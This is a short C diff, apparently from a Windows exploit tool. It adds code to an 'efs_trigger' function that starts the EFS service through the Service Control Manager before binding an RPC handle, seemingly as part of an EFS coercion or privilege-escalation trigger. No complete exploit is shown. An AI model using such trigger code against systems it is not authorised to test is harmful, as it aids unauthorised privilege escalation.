@@ -52,6 +52,18 @@ static handle_t couch_bind(void) {
 DWORD WINAPI efs_trigger(LPVOID param) {
     printf("[*] Trigger running\n");
 
+    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hSvc = OpenServiceA(hSCM, "EFS", SERVICE_START | SERVICE_QUERY_STATUS);
+        if (hSvc) {
+            StartServiceA(hSvc, 0, NULL);
+            Sleep(1000);
+            CloseServiceHandle(hSvc);
+        }
+        CloseServiceHandle(hSCM);
+    }
+
+
     handle_t ht = couch_bind();
     if (!ht) return 1;
     printf("[*] Bound\n");
